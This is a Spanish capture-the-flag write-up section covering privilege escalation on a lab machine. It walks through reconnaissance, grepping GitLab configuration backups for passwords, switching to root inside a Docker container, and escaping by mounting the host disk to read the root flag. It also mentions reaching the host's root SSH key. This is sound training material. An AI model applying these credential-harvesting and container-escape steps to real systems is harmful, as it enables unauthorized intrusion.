## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
echo $PATH
cd /
find \-perm -4000 2>/dev/null
hostname -I
hostname
```

Aqui podemos ver que el comando `hostname -I` nos da una ip que no es la ip de la maquina victima. Estamos en un contenedor

#### Escapar del contenedor {-}

```bash
cd /
ls -la
cd /opt
ls -l
```

Vemos un fichero `/root_pass` en la raiz, y en el directorio opt vemos un directorio `backup` y `gitlab`.

```bash
cat /root_pass
#Output
YG65407Bjqvv9A0a8Tm_7w

su root
Password: YG65407Bjqvv9A0a8Tm_7w

su dude
Password: YG65407Bjqvv9A0a8Tm_7w
```

No es una contraseña.

```bash
cd /opt
ls 
cd /backup
ls -l

cat docker-compose.yml
cat gitlab-secrets.json
cat gitlab-secrets.json | grep "pass"
cat gitlab-secrets.json | grep "user"
cat gitlab.rb
cat gitlab.rb | grep "pass"
```

Hay mucha informacion en estos ficheros. El gitlab.rb contiene un password para el servicio smtp.

```bash
su root
Password: wW59U!ZKMbG9+*#h
whoami
#Output
root
```

Emos podido passar al usuario root pero del contenedor. Aqui algo que todavia suena turbio es este fichero `root_pass`.
Buscamos en los ficheros la coincidencias de este fichero

```bash
grep -r -i "root_pass" 2>/dev/null
```

Aqui vemos un `/dev/sda2` que parece montado sobre un **root_pass**

```bash
df -h
fdisk -l
```

Aqui vemos que en `/dev/sda2` hay un linux filesystem de 18G que se monta directamente con `/root_pass`. Vamos a intentar montarlo.

```bash
mkdir /mnt/mounted
mount /dev/sda2 /mnt/mounted
ls -l
cd /root
cat root.txt
```

Ademas podemos connectarnos como root directamente a la maquina victima con ssh porque tenemos accesso a la id_rsa del usuario root de la maquina
victima.
